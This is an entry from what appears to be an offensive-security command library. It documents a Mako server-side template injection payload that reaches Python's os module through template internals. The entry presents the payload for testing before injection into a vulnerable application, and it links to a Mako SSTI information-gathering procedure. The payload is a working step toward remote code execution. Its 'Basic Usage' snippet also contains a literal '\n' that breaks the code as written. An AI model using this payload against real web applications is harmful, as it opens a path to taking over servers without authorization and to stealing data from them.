---
id: 35e3e0b1-eb43-41f5-8829-e0c99151c77f
name: print-mako-os-module-path
type: command
executor: python
data: 'print(Template("${self.module.cache.util.os}").render())'
output: null
created_at: '2023-04-06T03:56:40.091629+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - linux
  - python
tags:
  - ssti
  - mako
  - recon
verified: true
validated: true
---

# print-mako-os-module-path

## Command

```python
print(Template("${self.module.cache.util.os}").render())
```

## Description

This command renders a Mako template payload locally to access and print the path of the Python 'os' module via internal cache structures. It is used to validate SSTI payloads before injecting them into a vulnerable application.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; the payload is hardcoded. | N/A |

## Examples

### Basic Usage

```python
from mako.template import Template\nprint(Template("${self.module.cache.util.os}").render())
```

### Advanced Usage

Run in a Python environment with Mako installed to simulate server-side rendering.

## Expected Output

`<module 'os' from '/usr/lib/python3.10/os.py'>` (path varies by Python installation).

## Related

- [[procedures/Mako-SSTI-OS-Information-Gathering]]
